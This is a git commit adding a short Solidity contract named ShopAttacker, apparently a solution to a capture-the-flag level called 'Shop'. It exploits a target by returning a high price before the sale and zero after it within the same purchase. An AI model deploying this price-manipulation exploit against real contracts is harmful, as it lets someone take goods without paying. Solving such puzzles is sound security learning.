8133517ddb7e9c1f659bb18a134327d8ed2c1b22
nukanoto <nukanoto@nukanoto.net>
2022-08-19 02:05:36 +0900

    add Shop

---
+++ src/ShopAttacker.sol
@@ -0,0 +1,24 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.16;
+
+interface IShop {
+    function buy() external;
+    function isSold() external view returns (bool);
+}
+
+contract ShopAttacker {
+    IShop instance;
+
+    function attack(address instanceAddr) external {
+        instance = IShop(instanceAddr);
+        instance.buy();
+    }
+
+    function price() external view returns (uint) {
+        if (!instance.isSold()) {
+            return 100;
+        } else {
+            return 0;
+        }
+    }
+}
